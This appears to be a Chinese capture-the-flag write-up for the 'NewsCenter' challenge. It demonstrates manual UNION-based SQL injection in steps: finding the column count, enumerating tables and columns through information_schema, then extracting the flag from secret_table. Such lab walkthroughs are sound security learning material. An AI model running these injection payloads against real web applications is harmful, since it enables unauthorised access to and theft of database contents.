# NewsCenter

## 这一题考察的是 SQL 注入

 首先用 `' and 0 union select 1,2,3 #` 来初步判断该sql查询返回三列数据

![](https://img-blog.csdnimg.cn/20190608195547527.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjE1MTYxMQ==,size_16,color_FFFFFF,t_70)

然后用 `' and 0 union select 1,TABLE_SCHEMA,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS #` 得到表名，很明显我们需要得到 `secret_table` 表中的内容
![](https://img-blog.csdnimg.cn/20190608195755204.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjE1MTYxMQ==,size_16,color_FFFFFF,t_70)

再用 `' and 0 union select 1,column_name,data_type from information_schema.columns where table_name='secret_table'#` 得到 `secret_table` 表的列名以及数据类型

![](https://img-blog.csdnimg.cn/20190608200218788.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjE1MTYxMQ==,size_16,color_FFFFFF,t_70)

最后就可以简单粗暴地得到flag

`' and 0 union select 1,2,fl4g from secret_table #`

![](https://img-blog.csdnimg.cn/20190608200423409.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjE1MTYxMQ==,size_16,color_FFFFFF,t_70)

#### 尽管这一题用sqlmap也很好做，但是如果学习的话，还是自己手操一遍比较好